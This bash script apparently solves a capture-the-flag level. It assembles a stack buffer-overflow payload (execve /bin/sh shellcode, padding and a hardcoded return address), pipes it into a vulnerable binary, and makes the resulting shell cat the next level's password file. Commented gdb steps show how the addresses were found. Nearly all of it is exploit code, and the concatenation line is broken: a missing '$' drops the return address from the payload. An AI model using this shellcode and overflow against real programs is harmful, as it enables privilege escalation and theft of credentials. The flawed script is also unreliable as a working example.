#!/bin/bash

# OVERFLOW=`perl -e 'print "a" x 76 . "\x44\x84\x04\x08"' 2> /dev/null`
# GETPASS="cat /home/user/level2/.pass"

set -x

# gdb -q ./level1 << EOI
#     info functions
#     disas run
#     x/s 0x8048584
#     quit
# EOI

# OFFSET=80
SHELLCODE="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
# LENGTH=${#SHELLCODE}
PADDING=`python -c 'print("A" * 52)'` # OFFSET=80 - SHELLCODE_LENGTH=28
RETADDRESS="\x08\xa0\x04\x08"

# EXPLOIT=`perl -e 'print($SHELLCODE + $PADDING + RETADDRESS)'`
EXPLOIT="$SHELLCODE$PADDINGRETADDRESS"

echo $SHELLCODE
echo $PADDING
echo $RETADDRESS

# exit 0
echo $EXPLOIT

(echo $EXPLOIT - | ./level2) << EOI
    echo "\nid: \$(id)"
    echo "Next pass is: \$($GETPASS)\n"
EOI